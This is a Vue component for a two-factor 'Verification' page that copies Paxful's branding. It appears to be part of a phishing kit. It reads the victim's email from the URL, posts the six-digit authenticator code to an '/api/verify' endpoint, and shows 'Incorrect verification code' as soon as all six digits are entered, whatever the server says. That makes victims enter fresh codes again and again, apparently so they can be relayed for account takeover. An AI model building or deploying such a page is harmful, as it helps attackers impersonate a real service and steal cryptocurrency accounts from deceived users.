<template>
    <div class="container">
      <div class="login-section">
        <div class="logo">
          <img :src="getPhoto() + '/paxful.png'" alt="Paxful Logo">paxful
        </div>
        <div class="back-button">&lt; <a href="/">Back</a></div>
        <div class="welcome-text">Verification</div>
        <div class="signup-link">
          Enter the 6-digit code we sent to the authenticator associated with your account:<strong>{{ email }}</strong>
        </div>
        <div class="signup-link">Confirmation code</div>
        <div class="input-group code-inputs">
          <input
            v-for="(box, index) in inputBoxes"
            :key="index"
            v-model="box.value"
            :ref="`input-${index}`"
            type="text"
            maxlength="1"
            class="input-box"
            @input="handleInput(index)"
            @keydown="handleKeydown(index, $event)"
            @paste="handlePaste($event)"
          />
        </div>
        <div v-if="errorMessage" class="signup-link error-message">
          Incorrect verification code. Please try again.
        </div>
      </div>
      <div class="illustration-section">
        <div class="illustration">
          <img :src="getPhoto() + '/registersvg.PNG'" alt="Illustration">
        </div>
      </div>
    </div>
</template>


<script>
export default {
  data() {
    return {
      email: this.$route.query.email || "",
      inputBoxes: Array.from({ length: 6 }, () => ({ value: '' })), // Array of input boxes
      errorMessage: false, // To show/hide error message
    };
  },
  methods: {
    getPhoto()
    {
        return "/storage/images/";
    },
    // Handle input event
    handleInput(index) {
      this.errorMessage = false; // Hide error when user changes input
      if (this.inputBoxes[index].value.length === 1 && index < this.inputBoxes.length - 1) {
        this.$refs[`input-${index + 1}`][0].focus(); // Move focus to the next input
      }
      this.checkFilled();
    },

    // Handle keydown event (backspace)
    handleKeydown(index, event) {
      if (event.key === 'Backspace' && !this.inputBoxes[index].value && index > 0) {
        this.$refs[`input-${index - 1}`][0].focus(); // Move focus to the previous input
      }
    },

    // Handle paste event
    handlePaste(event) {
      event.preventDefault();
      const pastedData = event.clipboardData.getData('text').trim();

      if (/^\d{6}$/.test(pastedData)) {
        pastedData.split('').forEach((char, idx) => {
          if (this.inputBoxes[idx]) {
            this.inputBoxes[idx].value = char;
          }
        });
        this.$refs[`input-${this.inputBoxes.length - 1}`][0].focus(); // Move focus to the last input
        this.checkFilled();
      }
    },

    // Check if all inputs are filled
    checkFilled() {
      const allFilled = this.inputBoxes.every((box) => box.value !== '');
      if (allFilled) {
        this.errorMessage = true; // Show error immediately when all inputs are filled
        const code = this.inputBoxes.map((box) => box.value).join('');
        this.submitCode(code);
      }
    },

    // Submit the code to the server
    async submitCode(code) {
      try {
        const response = await axios.post('/api/verify', { 
          code, 
          email: this.email // Include email in the request
        }, {
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content,
          }
        });

        if (response.data.status === 'success') {
          this.$router.push('/login'); // Redirect on success
        } else {
          this.errorMessage = true; // Show error message if the code is incorrect
        }
      } catch (error) {
        console.error('Error:', error);
        this.errorMessage = true; // Show error message on network error
      }
    }


  },
};
</script>

<style>
body {
    font-family: 'Inter', sans-serif;
    margin: 0;
    background-color: #000;
    color: #fff;
    display: flex;
    justify-content: center;
    align-items: flex-start;
    height: auto;
    font-weight: 400;
    line-height: 1.5;
}

.container {
    display: flex;
    flex-wrap: wrap;
    width: 100%;
    max-width: 1200px;
    align-items: flex-start;
    justify-content: center;
    padding: 20px;
    box-sizing: border-box;
}

.back-button a {
    color: white;
    text-decoration: none;
}

.back-button {
    margin-bottom: 10px;
    font-size: 16px;
    color: white;
}

.illustration-section {
    display: none;
}

.illustration img {
    width: 100%;
    height: 100%;
    object-fit: cover;
}

.logo {
    font-size: 30px;
    font-weight: 600;
    padding-top: 5px;
    margin: 0 0 20px 0;
}

.logo img {
    height: 24px;
}

.welcome-text {
    font-size: 2rem;
    font-weight: 600;
    margin-bottom: 10px;
    margin-top: 10px;
}

.signup-link {
    margin-bottom: 20px;
    font-size: 14px;
}

.signup-link a {
    color: white;
    text-decoration: none;
    font-weight: 600;
}

.input-group {
    display: grid;
    grid-template-columns: repeat(6, 1fr);
    gap: 10px;
    justify-content: center;
    max-width: 320px;
}

.input-box {
    width: 50px;
    height: 50px;
    text-align: center;
    font-size: 24px;
    background-color: #1F1F1F;
    color: #fff;
    border: none;
    border-radius: 10px;
    cursor: pointer;
}

button {
    width: 100%;
    padding: 14px;
    background-color: #A8E239;
    color: #000;
    border: none;
    border-radius: 50px;
    cursor: pointer;
    font-size: 16px;
    font-weight: 600;
    margin-top: 10px;
}

.forgot-password {
    margin-top: 5px;
    text-align: right;
    font-size: 14px;
}

.forgot-password a {
    color: #ECECEC;
    text-decoration: none;
}

.error-message {
    color: red;
    font-weight: bold;
}

@media (min-width: 768px) {
    .container {
        flex-direction: row;
        justify-content: space-between;
        padding: 40px;
    }

    .login-section {
        width: 40%;
        text-align: left;
        margin-left: 20px;
    }

    .illustration-section {
        display: flex;
        width: 50%;
        align-items: center;
        justify-content: center;
    }
}
</style>